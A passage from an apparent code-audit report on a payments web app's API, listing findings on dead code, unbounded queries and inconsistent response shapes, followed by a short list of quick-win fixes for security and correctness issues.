**File:** `apps/web/app/api/payments/[id]/refund/route.ts:216`
**Problem:** ```const sig = event as unknown as { selector?: string }; void sig;``` — a cast to a shape `parseAbiItem` doesn't return, immediately discarded. It is the vestige of the topic-0 check that API-03 says is missing, and its presence makes the function read as if it validates the event signature when it doesn't.
**Fix:** Delete both lines as part of the API-03 rewrite.
**Effort:** S

### API-37 — Unbounded / unpaginated list queries

**Severity:** Low
**File:** `apps/web/app/api/analytics/route.ts:59`
**Problem:** The subscriptions query has no `LIMIT` at all and deliberately skips the date filter ("we don't range-filter on createdAt here", `:51-53`), loading every non-trial subscription the org has ever had into memory on each dashboard render. `app/api/products/route.ts:60` and `app/api/blocklist/route.ts:37` and `app/api/payment-links/route.ts:27` are likewise unbounded; `app/api/invoices/route.ts:31` caps at 500 and `app/api/payments/route.ts:42` at 100, but neither offers a cursor, so a merchant with >100 payments cannot page past the most recent. Only `app/api/settings/audit-log/route.ts:62` implements cursor pagination.
**Fix:** Aggregate the MRR series in SQL rather than in JS, and add the `before`/`limit` cursor pattern from `audit-log/route.ts:62-73` to the list endpoints.
**Effort:** M

### API-38 — Inconsistent success-response shapes across create endpoints

**Severity:** Low
**File:** `apps/web/app/api/customers/route.ts:69`
**Problem:** Creates return four different shapes: `{customer: inserted}` here, the bare row at `app/api/webhooks/route.ts:124` / `app/api/blocklist/route.ts:114` / `app/api/payment-links/route.ts:102` / `app/api/subscriptions/gift/route.ts:144`, `{checkoutUrl, checkoutId, subscriptionId}` at `app/api/checkout/route.ts:154`, and `{success: true, refundId}` at `app/api/refund-requests/[id]/approve/route.ts:186`. Deletes are split between `{ok: true}` (`customers/[id]/delete/route.ts:36`) and `{success: true}` (`webhooks/[id]/route.ts:150`, `products/[id]/route.ts:195`). Errors are consistent (`apiError` everywhere) — successes are not, which forces per-endpoint handling in the SDK.
**Fix:** Pick one envelope (bare resource for creates, `{ok: true}` for deletes) and add an `apiOk()` counterpart to `lib/api-error.ts`.
**Effort:** S

## Quick Wins

- **API-01** — add `livemode` to six inserts; drop the schema default so the type system enforces it.
- **API-02** — throw instead of falling back to the hardcoded portal secret.
- **API-03** / **API-36** — swap the hand-rolled log decoder for `parseEventLogs` in both refund routes.
- **API-07**, **API-08** — replace two `.select()` / `.returning()` calls with explicit column lists.
- **API-14** — one-character-class fix: `Math.trunc` instead of `| 0`.
- **API-15**, **API-16** — wrap the refund write in `db.transaction`, add `orgScope` to the dedup query.
- **API-20** — pass `"secret"` to `authenticateApiKey` in the faucet route.
- **API-29** — prefix `'` on formula-leading CSV cells.
- **API-35** — delete the dead `webhooks/[id]/test` route.
